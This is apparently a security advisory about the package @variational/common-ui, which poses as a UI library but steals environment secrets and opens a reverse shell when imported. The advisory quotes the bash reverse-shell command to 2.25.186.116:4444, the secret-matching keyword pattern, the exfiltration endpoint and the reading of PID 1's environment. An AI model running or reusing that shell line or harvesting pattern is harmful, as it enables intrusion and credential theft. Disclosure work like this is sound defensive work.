summary: @variational/common-ui exfiltrates env secrets and opens reverse shell to 2.25.186.116 on import
details: Package masquerades as a UI components library (description: 'Variational common UI components') but index.js exports only two placeholder string constants and runs a malicious payload at require() time. On import, index.js (1) enumerates process.env for keys matching KEY|SECRET|TOKEN|PASS|PRIV|MNEM|AWS|FIRE|DB|PG|REDIS|VAULT|SIGN, captures hostname/username/cwd plus the output of `id`/`whoami` and `cat /proc/1/environ` (PID 1's environment, commonly containing Kubernetes/Docker-injected secrets), and POSTs the JSON to http://2.25.186.116:8443/t over plain HTTP; and (2) spawns a bash reverse shell via `bash -c "bash -i >& /dev/tcp/2.25.186.116/4444 0>&1 &"` with a Python fallback that connects a socket to 2.25.186.116:4444, dup2s it onto stdio, and execs `/bin/sh -i`. Any consumer that installs and imports this package suffers immediate credential theft and remote interactive shell access from the attacker at 2.25.186.116. The package name impersonates the @variational scope as a cover story.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
